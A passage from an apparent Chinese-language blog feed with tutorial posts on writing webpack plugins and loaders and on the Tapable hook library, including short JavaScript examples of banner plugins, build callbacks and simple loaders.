compilation）</li></ul><p>看看他们的代码会有很多收获  </p><p><a href="https://github.com/webpack/webpack/blob/master/lib/Compilation.js" target="_blank" rel="noopener">Compilation</a></p><p><a href="https://github.com/webpack/webpack/blob/master/lib/Compiler.js" target="_blank" rel="noopener">Compiler</a></p><h4 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h4><p>Compiler暴露了和webpack整个生命周期相关的钩子，通过如下的方式访问:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//基本写法</span><br><span class="line">compiler.hooks.someHook.tap(...)</span><br><span class="line">//如果希望在entry配置完毕后执行某个功能</span><br><span class="line">compiler.hooks.entryOption.tap(...)</span><br><span class="line">//如果希望在生成的资源输出到output指定目录之前执行某个功能</span><br><span class="line">compiler.hooks.emit.tap(...)</span><br></pre></td></tr></table></figure><ul><li>webpack中有complier对象，代表webpack实例。有编译的具体参数。</li><li>complation代表本次编译，有打包的文件等信息</li></ul><h4 id="complication"><a href="#complication" class="headerlink" title="complication"></a>complication</h4><p><a href="https://www.webpackjs.com/api/compilation-hooks/" target="_blank" rel="noopener">对应钩子</a></p><p>buildModule – 在模块构建开始之前触发</p><p>failedModule – 模块构建失败时执行</p><p>seal – 编译(compilation)停止接收新模块时触发。</p><p>optimize – 优化阶段开始时触发。</p><p>…</p><h3 id="Tapable"><a href="#Tapable" class="headerlink" title="Tapable"></a>Tapable</h3><p>说到 compiler 和 compilation 对象更不得不提 Tapable</p><p>tapable是webpack的核心框架，是一个基于事件流的框架，或者叫做发布订阅模式，或观察者模式。webpack 中许多对象扩展自 Tapable 类。</p><p>tapable 这个类暴露 tap, tapAsync 和 tapPromise 方法，可以使用这些方法，注入自定义的构建步骤，这些步骤将在整个编译过程中不同时机触发。</p><p><a href>先看下看另一篇</a></p><h3 id="插件类型-plugin-types"><a href="#插件类型-plugin-types" class="headerlink" title="插件类型(plugin types)"></a>插件类型(plugin types)</h3><p>根据所使用的 钩子(hook) 和 tap 方法，插件可以以多种不同的方式运行。这个工作方式与 Tapable 提供的 hooks 密切相关。compiler hooks 分别记录了 Tapable 内在的钩子，指出哪些 tap 方法可用。</p><p>因此，根据你触发到 tap 事件，插件可能会以不同的方式运行。例如，当钩入 compile 阶段时，只能使用同步的 tap 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compiler.hooks.compile.tap(&apos;MyPlugin&apos;, params =&gt; &#123;</span><br><span class="line">  console.log(&apos;以同步方式触及 compile 钩子。&apos;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然而，对于能够使用了 AsyncHook(异步钩子) 的 run，我们可以使用 tapAsync 或 tapPromise（以及 tap）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">compiler.hooks.run.tapAsync(&apos;MyPlugin&apos;, (compiler, callback) =&gt; &#123;</span><br><span class="line">  console.log(&apos;以异步方式触及 run 钩子。&apos;)</span><br><span class="line">  callback()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">compiler.hooks.run.tapPromise(&apos;MyPlugin&apos;, compiler =&gt; &#123;</span><br><span class="line">  return new Promise(resolve =&gt; setTimeout(resolve, 1000)).then(() =&gt; &#123;</span><br><span class="line">    console.log(&apos;以具有延迟的异步方式触及 run 钩子&apos;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>可以有多种方式将 hook 钩入到 compiler 中，可以让各种插件都以合适的方式去运行。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Compiler extends Tapable &#123;</span><br><span class="line">constructor(context) &#123;</span><br><span class="line">super();</span><br><span class="line">this.hooks = &#123;</span><br><span class="line">/** @type &#123;SyncBailHook&lt;Compilation&gt;&#125; */</span><br><span class="line">shouldEmit: new SyncBailHook([&quot;compilation&quot;]),</span><br><span class="line">/** @type &#123;AsyncSeriesHook&lt;Stats&gt;&#125; */</span><br><span class="line">done: new AsyncSeriesHook([&quot;stats&quot;]),</span><br><span class="line">/** @type &#123;AsyncSeriesHook&lt;&gt;&#125; */</span><br><span class="line">additionalPass: new AsyncSeriesHook([]),</span><br><span class="line">/** @type &#123;AsyncSeriesHook&lt;Compiler&gt;&#125; */</span><br><span class="line">beforeRun: new AsyncSeriesHook([&quot;compiler&quot;]),</span><br><span class="line">/** @type &#123;AsyncSeriesHook&lt;Compiler&gt;&#125; */</span><br><span class="line">run: new AsyncSeriesHook([&quot;compiler&quot;]),</span><br><span class="line">/** @type &#123;AsyncSeriesHook&lt;Compilation&gt;&#125; */</span><br><span class="line">emit: new AsyncSeriesHook([&quot;compilation&quot;]),</span><br><span class="line">/** @type &#123;AsyncSeriesHook&lt;Compilation&gt;&#125; */</span><br><span class="line">afterEmit: new AsyncSeriesHook([&quot;compilation&quot;]),</span><br></pre></td></tr></table></figure><h4 id="自定义的钩子函数-custom-hooks"><a href="#自定义的钩子函数-custom-hooks" class="headerlink" title="自定义的钩子函数(custom hooks)"></a>自定义的钩子函数(custom hooks)</h4><p>为了给其他插件的编译添加一个新的钩子，来 tap(触及) 到这些插件的内部，直接从 tapable 中 require 所需的钩子类(hook class)，然后创建：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const SyncHook = require(&apos;tapable&apos;).SyncHook;</span><br><span class="line"></span><br><span class="line">// 具有 `apply` 方法……</span><br><span class="line">if (compiler.hooks.myCustomHook) throw new Error(&apos;Already in use&apos;);</span><br><span class="line">compiler.hooks.myCustomHook = new SyncHook([&apos;a&apos;, &apos;b&apos;, &apos;c&apos;])</span><br><span class="line"></span><br><span class="line">// 在你想要触发钩子的位置/时机下调用……</span><br><span class="line">compiler.hooks.myCustomHook.call(a, b, c);</span><br></pre></td></tr></table></figure><h3 id="如何写一个plugin？"><a href="#如何写一个plugin？" class="headerlink" title="如何写一个plugin？"></a>如何写一个plugin？</h3><p>看完上面了解了一些基本内容，以及plugin的样子。怎么写一定要知道怎么样的一个东西可以称之为 webpack plugin呢？</p><p>一个完整的 webpack 插件需要满足以下几点规则和特征：</p><ul><li>是一个独立的模块。</li><li>模块对外暴露一个 js 函数。</li><li>函数的原型 (prototype) 上定义了一个注入 compiler 对象的 apply 方法。</li><li>apply 函数中需要有通过 compiler 对象挂载的 webpack 事件钩子，钩子的回调中能拿到当前编译的 compilation 对象，如果是异步编译插件的话可以拿到回调 callback。</li><li>完成自定义子编译流程并处理 complition 对象的内部数据。</li><li>如果异步编译插件的话，数据处理完成后执行 callback 回调。</li></ul><h3 id="两个plugin例子"><a href="#两个plugin例子" class="headerlink" title="两个plugin例子"></a>两个plugin例子</h3><p>（1）在每个chunk 中添加 个banner</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">const &#123; ConcatSource &#125; = require(&quot;webpack-sources&quot;);</span><br><span class="line">let pluginOptions = &#123;</span><br><span class="line">    name: &apos;myName&apos;,</span><br><span class="line">    stage: Infinity</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class BannerPlugin &#123;</span><br><span class="line">  constructor(doneF, failF) &#123;</span><br><span class="line">    this.doneF = doneF;</span><br><span class="line">    this.failF = failF;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  apply(compiler) &#123;</span><br><span class="line">      compiler.hooks.compilation.tap(&quot;BannerTest&quot;, compilation =&gt; &#123;</span><br><span class="line">    compilation.hooks.optimizeChunkAssets.tap(&quot;BannerTest&quot;, (chunks, callbak)  =&gt; &#123;</span><br><span class="line">      chunks.forEach(chunk =&gt; &#123;</span><br><span class="line">                  chunk.files.forEach(file =&gt; &#123;</span><br><span class="line">                      compilation.assets[file] = new ConcatSource(</span><br><span class="line">                      &apos;\/**i am the banner-  &apos; + new Date() + &apos;-**\/&apos;,</span><br><span class="line">                      &apos;\n&apos;,</span><br><span class="line">                      compilation.assets[file]</span><br><span class="line">                      );</span><br><span class="line">                  &#125;);</span><br><span class="line">              &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);   </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = BannerPlugin;</span><br></pre></td></tr></table></figure><p>（2）编译成功和失败回调</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">const &#123; ConcatSource &#125; = require(&quot;webpack-sources&quot;);</span><br><span class="line">let pluginOptions = &#123;</span><br><span class="line">    name: &apos;myName&apos;,</span><br><span class="line">    stage: Infinity</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ResultPlugin &#123;</span><br><span class="line">  constructor(doneF, failF) &#123;</span><br><span class="line">    this.doneF = doneF;</span><br><span class="line">    this.failF = failF;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  apply(compiler) &#123;</span><br><span class="line">      compiler.hooks.done.tap(pluginOptions,  (stats) =&gt; &#123;</span><br><span class="line">          this.doneF(&apos;我成功了&apos;);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      compiler.hooks.failed.tap(pluginOptions,   (err) =&gt; &#123;</span><br><span class="line">          this.failF(err);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      compiler.hooks.compilation.tap(&quot;BannerTest&quot;, compilation =&gt; &#123;</span><br><span class="line">    compilation.hooks.optimizeChunkAssets.tap(&quot;BannerTest&quot;, (chunks, callbak)  =&gt; &#123;</span><br><span class="line">      chunks.forEach(chunk =&gt; &#123;</span><br><span class="line">                  chunk.files.forEach(file =&gt; &#123;</span><br><span class="line">                      compilation.assets[file] = new ConcatSource(</span><br><span class="line">                      &apos;\/**Sweet Banner**\/&apos;,</span><br><span class="line">                      &apos;\n&apos;,</span><br><span class="line">                      compilation.assets[file]</span><br><span class="line">                      );</span><br><span class="line">                  &#125;);</span><br><span class="line">              &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = ResultPlugin;</span><br></pre></td></tr></table></figure><ul><li>compiler hook 的 tap 方法的第一个参数，应该是驼峰式命名的插件名称。建议为此使用一个常量，以便它可以在所有 hook 中复用。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>webpack plugin的本质，它实际上和webpack loader一样简单，其实它只是一个带有apply方法的class。</p><p>插件目的在于解决 loader 无法实现的其他事。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;plugin&quot;&gt;&lt;a href=&quot;#plugin&quot; class=&quot;headerlink&quot; title=&quot;plugin&quot;&gt;&lt;/a&gt;plugin&lt;/h3&gt;&lt;p&gt;先把&lt;a href=&quot;https://www.webpackjs.com/concepts/&quot; target
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>webpackLoader</title>
    <link href="http://swingboy.github.io/2019/03/29/webpackLoader/"/>
    <id>http://swingboy.github.io/2019/03/29/webpackLoader/</id>
    <published>2019-03-29T12:47:50.000Z</published>
    <updated>2019-11-23T14:30:56.931Z</updated>
    
    <content type="html"><![CDATA[<h3 id="什么是-Loader-？"><a href="#什么是-Loader-？" class="headerlink" title="什么是 Loader ？"></a>什么是 Loader ？</h3><p>本质上来说，loader 就是一个 node 模块，这很符合 webpack 中“万物皆模块”的思路。既然是 node 模块，那就一定会导出点什么。在 webpack 的定义中，loader 导出一个函数，loader 会在转换源模块（resource）的时候调用该函数。在这个函数内部，我们可以通过传入 this 上下文给 Loader API 来使用它们。</p><ul><li>我们也可以概括一下 loader 的功能：把源模块转换成通用模块。</li></ul><p>我们常常见到的，webpack 中的配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">let webpackConfig = &#123;</span><br><span class="line">    //...</span><br><span class="line">    module: &#123;</span><br><span class="line">        rules: [&#123;</span><br><span class="line">            test: /\.js$/,</span><br><span class="line">            use: [&#123;</span><br><span class="line">                loader: &apos;x-loader&apos;, </span><br><span class="line">                options: &#123;/* ... */&#125;</span><br><span class="line">            &#125;, &#123;</span><br><span class="line">                loader: &apos;y-loader&apos;, </span><br><span class="line">                options: &#123;/* ... */&#125;</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;,</span><br><span class="line">    resolveLoader: &#123;</span><br><span class="line">        modules: [&apos;node_modules&apos;, path.resolve(__dirname, &apos;loaders&apos;)]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h3><p>loader为 JavaScript 生态系统提供了更多能力。 用户现在可以更加灵活地引入细粒度逻辑，例如压缩、打包、语言翻译和其他更多。  </p><h3 id="常用loader"><a href="#常用loader" class="headerlink" title="常用loader"></a>常用loader</h3><p>style-loader——将处理结束的CSS代码存储在js中，运行时嵌入&lt;style&gt;后挂载至html页面上<br>css-loader——加载器，使webpack可以识别css模块<br>sass-loader——加载器，使webpack可以识别scss/sass文件，默认使用node-sass进行编译<br>less-loader<br>url-loader<br>babel-loader<br>cache-loader<br>…</p><p>一堆~~</p><h3 id="loader-特性"><a href="#loader-特性" class="headerlink" title="loader 特性"></a>loader 特性</h3><p>支持链式传递。一组链式的 loader 将按照相反的顺序执行。loader 链中的第一个 loader 返回值给下一个 loader。在最后一个 loader，返回 webpack 所预期的 JavaScript。<br>可以是同步的，也可以是异步的。  </p><p>运行在 Node.js 中，并且能够执行任何可能的操作。 </p><p>接收查询参数。用于对 loader 传递配置。  </p><p>也能够使用 options 对象进行配置。  </p><p>除了使用 package.json 常见的 main 属性，还可以将普通的 npm 模块导出为 loader，做法是在 package.json 里定义一个 loader 字段。  </p><p>loader 能够产生额外的任意文件。</p><h3 id="webpack-中如何工作的"><a href="#webpack-中如何工作的" class="headerlink" title="webpack 中如何工作的"></a>webpack 中如何工作的</h3><p>当你在 webpack 项目中引入模块时，匹配到 rule （例如下面的 /.js$/）就会启用对应的 loader。这时loader 会导出一个函数，这个函数接受的唯一参数是一个包含源文件内容的字符串。也就是source</p><p>接着我们在函数中处理 source 的转化，最终返回处理好的值。当然返回值的数量和返回方式依据 loader 的需求来定。一般情况下可以通过 return 返回一个值，也就是转化后的值。如果需要返回多个参数，则须调用 this.callback(err, values…) 来返回。在异步 loader 中你可以通过抛错来处理异常情况。Webpack 建议我们返回 1 至 2 个参数，第一个参数是转化后的 source，可以是 string 或 buffer。第二个参数可选，是用来当作 SourceMap 的对象。</p><h4 id="这些loader如何一起工作的"><a href="#这些loader如何一起工作的" class="headerlink" title="这些loader如何一起工作的"></a>这些loader如何一起工作的</h4><p>归根结底是将某中标准的文件转化为另一种标准的文件，也可以理解为字符串</p><p>以处理 scss 文件为例：</p><ul><li>1.scss 源代码会先交给 sass-loader 把 scss 转换成 css；  </li><li>2.把 sass-loader 输出的 CSS 交给 css-loader 处理，找出 CSS 中依赖的资源、压缩 CSS 等；  </li><li>3.把 css-loader 输出的 CSS 交给 style-loader 处理，转换成通过脚本加载的 JavaScript 代码；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webpack.config.js</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        test: /\.js/,</span><br><span class="line">        use: [</span><br><span class="line">            &apos;style-loader&apos;,</span><br><span class="line">            &apos;css-loader&apos;,</span><br><span class="line">            &apos;sass-loader&apos;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>loader 的调用顺序是 sass-loader -&gt; css-loader -&gt; style-loader。<br>sass-loader 拿到 source，处理后把 JS 代码传递给 css-loader，css-loader 拿到 sass-loader 处理过的 “source” ，再处理之后给 style-loader，style-loader 处理完后再交给 webpack。<br>style-loader 最终把返回值和 source map 传给 webpack。</p><h4 id="开发-Loader"><a href="#开发-Loader" class="headerlink" title="开发 Loader"></a>开发 Loader</h4><p>Loader 就像是一个翻译员，能把源文件经过转化后输出新的结果，并且一个文件还可以链式的经过多个翻译员翻译。</p><p>首先我们要知道：</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>按照loader的返回值可以分为两种：</p><ul><li>最左loader：这种loader会返回字符串描述的js模块代码，已经是loader的最终处理结果了，这样的字符串会被添加到webpack的模块函数中</li><li><p>非最左loader：返回值不是js模块代码，而仅仅是对资源的中间处理结果，这样的字符串需要被后续的loader处理</p><p>（一般情况下，在loader的链式调用中，一般是这样：最左loader！非最左loader！非最左loader ….）</p></li></ul> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function loader(source) &#123;</span><br><span class="line">//返回的值是js模块代码，这个loader属于最左loader  </span><br><span class="line">    return `module.exports = &#123;fn: $&#123;source&#125;&#125;`;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="aync-loader"><a href="#aync-loader" class="headerlink" title="aync loader"></a>aync loader</h5><p>把以上例子中的loader定义为</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> module.exports = function(source) &#123;</span><br><span class="line">    var callback = this.async();</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">       callback(null,`module.exports = &#123;fn: $&#123;source&#125;&#125;`)</span><br><span class="line">    &#125;,5000);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="pitching-loader"><a href="#pitching-loader" class="headerlink" title="pitching loader"></a>pitching loader</h5><p>在loader函数对象上添加一个pitch属性，这个pitch所执行的函数称为pitching loader。在pitching loader中可以通过data把数据传递给对应的loader，而不能传递给其他loader。</p><p>在链式调用中，pitching loader 与 loader的执行次序（以 a!b!c!resource 为例）</p><p>pitch a<br>    pitch b<br>        pitch c<br>            read file resource (adds resource to dependencies)<br>        run c<br>    run b<br>run a  </p><ul><li>style-loader 为例</li></ul><p><a href="https://www.webpackjs.com/contribute/writing-a-loader/" target="_blank" rel="noopener">官方翻译文档编写一个loader</a></p><h4 id="开始写吧"><a href="#开始写吧" class="headerlink" title="开始写吧 ~~"></a>开始写吧 ~~</h4><ul><li>创建 loader 的目录及模块文件</li><li>在 webpack 中配置 rule 及 loader 的解析路径，并且要注意 loader 的顺序，这样在 require 指定类型文件时，我们能让处理流经过指定 laoder。</li><li>遵循原则设计和开发 loader。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//解析路径  </span><br><span class="line">resolveLoader: &#123;</span><br><span class="line">        modules: [&apos;node_modules&apos;, path.resolve(__dirname, &apos;loaders&apos;)]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最简单的loader,source 中加一行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var loaderUtils = require(&apos;loader-utils&apos;);</span><br><span class="line"></span><br><span class="line">module.exports = function(source) &#123;</span><br><span class="line">    var opts = loaderUtils.getOptions(this) || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    console.log(this.context, );</span><br><span class="line">    console.log(this.resource);</span><br><span class="line">    // console.info(opts);</span><br><span class="line">    return `//i am the test line;\n$&#123;source&#125;`;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>实现的一个简易的babel-loader</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var babel = require(&quot;@babel/core&quot;)</span><br><span class="line">//https://webpack.js.org/api/loaders/#this-callback</span><br><span class="line">module.exports = function (source, inputSourceMap) &#123;</span><br><span class="line">  var babelOptions = &#123;</span><br><span class="line">    presets: [&apos;@babel/preset-env&apos;],</span><br><span class="line">    inputSourceMap: inputSourceMap,</span><br><span class="line">    filename: this.request.split(&apos;!&apos;)[1].split(&apos;/&apos;).pop(),</span><br><span class="line">    sourceMaps: true</span><br><span class="line">  &#125;</span><br><span class="line">  var result = babel.transform(source, babelOptions)</span><br><span class="line">  this.callback(null, result.code, result.map)</span><br><span class="line"></span><br><span class="line">return ;//// always return undefined when calling callback()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>串联组合中的 loader 并不一定要返回 JS 代码。只要下游的 loader 能有效处理上游 loader 的输出，那么上游的 loader 可以返回任意类型的模块。</li></ul><h4 id="还有一些常用-API："><a href="#还有一些常用-API：" class="headerlink" title="还有一些常用 API："></a>还有一些常用 API：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">this.context：当前处理文件的所在目录，假如当前 Loader 处理的文件是 /src/main.js，则 this.context 就等于 /src。</span><br><span class="line">this.resource：当前处理文件的完整请求路径，包括 querystring，例如 /src/main.js?name=1。</span><br><span class="line">this.resourcePath：当前处理文件的路径，例如 /src/main.js。</span><br><span class="line">this.resourceQuery：当前处理文件的 querystring。</span><br><span class="line">this.target：等于 Webpack 配置中的 Target。</span><br><span class="line">this.loadModule：但 Loader 在处理一个文件时，如果依赖其它文件的处理结果才能得出当前文件的结果时， 就可以通过 this.loadModule(request: string, callback: function(err, source, sourceMap, module)) 去获得 request 对应文件的处理结果。</span><br><span class="line">this.resolve：像 require 语句一样获得指定文件的完整路径，使用方法为 resolve(context: string, request: string, callback: function(err, result: string))。</span><br><span class="line">this.addDependency：给当前处理文件添加其依赖的文件，以便再其依赖的文件发生变化时，会重新调用 Loader 处理该文件。使用方法为 addDependency(file: string)。</span><br><span class="line">this.addContextDependency：和 addDependency 类似，但 addContextDependency 是把整个目录加入到当前正在处理文件的依赖中。使用方法为 addContextDependency(directory: string)。</span><br><span class="line">this.clearDependencies：清除当前正在处理文件的所有依赖，使用方法为 clearDependencies()。</span><br><span class="line">this.emitFile：输出一个文件，使用方法为 emitFile(name: string, content: Buffer|string, sourceMap: &#123;...&#125;)。</span><br></pre></td></tr></table></figure><p><a href="https://segmentfault.com/a/1190000012990122" target="_blank" rel="noopener">写一个loader</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;什么是-Loader-？&quot;&gt;&lt;a href=&quot;#什么是-Loader-？&quot; class=&quot;headerlink&quot; title=&quot;什么是 Loader ？&quot;&gt;&lt;/a&gt;什么是 Loader ？&lt;/h3&gt;&lt;p&gt;本质上来说，loader 就是一个 node 模块，这很符合
      
    
    </summary>
    
    
      <category term="技术" scheme="http://swingboy.github.io/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>about tapable</title>
    <link href="http://swingboy.github.io/2019/03/29/about-tapable/"/>
    <id>http://swingboy.github.io/2019/03/29/about-tapable/</id>
    <published>2019-03-29T12:46:15.000Z</published>
    <updated>2019-11-23T14:30:05.255Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tapable"><a href="#tapable" class="headerlink" title="tapable"></a>tapable</h2><p>Webpack 本质上是一种事件流的机制，它的工作流程就是将各个插件串联起来，而实现这一切的核心就是 tapable ，Webpack 中最核心的，负责编译的 Compiler 和负责创建 bundles 的 Compilation 都是 tapable 构造函数的实例。</p><p>都是继承自Tapable</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Compiler extends Tapable &#123;</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>webpack的灵魂Tapable，有点类似于nodejs的Events，都是注册一个事件，然后到了适当的时候触发。这里的事件触发是这样绑定触发的，通过on方法，绑定一个事件，emit方法出发一个事件。Tapable的机制和这类似，也是tap注册一个事件，然后call执行这个事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const EventEmitter = require(&apos;events&apos;);</span><br><span class="line">const myEmitter = new EventEmitter();</span><br><span class="line">myEmitter.on(&apos;newListener&apos;, (param1,param2) =&gt; &#123;</span><br><span class="line">console.log(&quot;newListener&quot;,param1,param2)</span><br><span class="line">&#125;);</span><br><span class="line">myEmitter.emit(&apos;newListener&apos;, 1, 2);</span><br></pre></td></tr></table></figure><ul><li>想想ttm <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 